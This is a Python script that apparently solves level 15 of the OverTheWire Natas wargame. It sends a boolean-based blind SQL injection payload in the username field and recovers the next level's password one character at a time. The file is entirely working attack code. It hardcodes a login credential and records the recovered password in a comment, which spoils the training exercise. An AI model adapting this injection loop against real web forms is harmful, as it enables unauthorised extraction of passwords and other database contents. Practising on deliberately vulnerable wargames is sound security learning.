#import sys
from string import ascii_letters, digits
import os
from termcolor import colored
import pyperclip
try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')



charset               = ascii_letters + digits
natas_login_username  = 'natas15'
natas_login_password  = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url                   = "http://natas15.natas.labs.overthewire.org/"

# "SELECT * from users where username= "natas16"
# ==> injection
# "SELECT * from users where username= "natas16" AND password LIKE BINARY "char_in_password%" -- - "
sqli                  = 'natas16" AND password LIKE BINARY "{}" -- -'

brower      = requests.Session()
brower.auth = (natas_login_username, natas_login_password)

hacked_password = ''
correct_status = 'This user exists'
while len(hacked_password) < 32: # Make sure password length = 32
    for char in charset:
        payload = sqli.format(hacked_password+char+'%')
        print(payload)

        post_data = {
            'username': payload
        }

        res = brower.post(url, data=post_data)

        if correct_status in res.text:
            hacked_password += char
            # sys.stdout.write(char)
            # sys.stdout.flush()
            break

print('\n')
print(colored(hacked_password, 'red'))
# WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

print('\n')
pyperclip.copy(hacked_password)
print(colored('Hacked password have been copy to clipboard', 'blue'))